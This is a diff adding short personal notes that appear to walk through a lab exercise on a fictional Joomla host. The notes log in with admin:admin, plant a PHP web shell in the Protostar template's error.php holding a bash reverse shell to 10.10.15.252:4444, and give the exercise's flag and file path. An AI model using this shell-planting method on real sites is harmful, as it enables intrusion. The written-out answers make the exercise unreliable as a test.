@@ -1,1 +1,14 @@
 
+add dev.inlanefreight.local to /etc/hosts 
+
+Question 1 - Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application - j00mla_c0re_d1rtrav3rsal! 
+
+1) http://dev.inlanefreight.local/administrator/index.php
+2) use the admin:admin creds from section 
+3) once logged in -> extensions -> tempaltes -> protostar 
+4) go to error.php and use this sweb shell - >  exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.252/4444 0>&1'");
+5) open nc listener 
+6) save the file 
+7) navigate to -> http://dev.inlanefreight.local/templates/protostar/error.php -> this wil lcatch the shell 
+8) enumerate til you find flag @ /var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
+9) cat ../../flag_6470e394cbf6dab6a91682cc8585059b.txt 
